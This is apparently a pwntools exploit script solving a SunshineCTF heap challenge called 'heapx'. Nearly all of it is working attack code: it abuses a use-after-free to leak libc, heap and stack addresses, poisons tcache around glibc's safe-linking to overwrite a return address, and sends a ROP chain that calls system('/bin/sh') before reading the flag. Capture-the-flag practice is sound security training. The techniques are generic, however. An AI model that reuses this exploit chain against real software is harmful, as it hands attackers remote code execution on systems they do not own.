from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./heapx.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("chal.sunshinectf.games", 25004)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def add(size):
    io.sendlineafter("> ", f"new {size}")


def delete(id):
    io.sendlineafter("> ", f"delete {id}")


def show(id):
    io.sendlineafter("> ", f"read {id}")


def edit(id, size, content):
    io.sendlineafter("> ", f"write {id} {size}")
    io.sendlineafter("Enter log data: ", content)


def exit():
    io.sendlineafter("> ", "exit")


add(0x420)
add(0x20)
add(0x20)
add(0x20)
add(0x20)
delete(0)
show(0)

# leak libc
#leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
leak = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = leak - 0x210b20
log.success("libc.address :-----> " + hex(libc.address))
# leak heap
delete(1)
show(1)
leak = u64(io.recv(5).ljust(8, b"\x00"))
heap = (leak - 1) << 12
log.success("heap :-----> " + hex(heap))

# leak stack
libc_environ = libc.symbols["__environ"]
log.success("environ :-----> " + hex(libc_environ))
delete(2)
edit(2, 0, p64((libc_environ - 0x18) ^ (heap >> 12) + 1))
add(0x20) #5
add(0x20) #6
edit(6, 0, "a" * 0x18)
show(6)
io.recv(24)
leak = u64(io.recv(6).ljust(8, b"\x00"))
log.success("leak statck :-----> " + hex(leak))
edit_ret = leak - 0x160
log.success("edit ret :---> " + hex(edit_ret))

# malloc edit ret
add(0xa0)
add(0xa0)
delete(7)
delete(8)

edit(8, 0, p64((edit_ret - 0x48) ^ (heap >> 12) + 1))
ddebug("breakrva 0x12fa\n breakrva 0x001570\n breakrva 0x015D2\n continue")
add(0xa0) #9
add(0xa0) #10

system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
rop = ROP(libc)
ret = rop.find_gadget(["ret"])[0]

# change edit ret -> rop
payload = p64(pop_rdi) + p64(binsh_addr)
payload += p64(ret) + p64(system_addr)
edit(10, 0x48, payload)

io.sendline(b"cat flag.txt")

io.interactive()
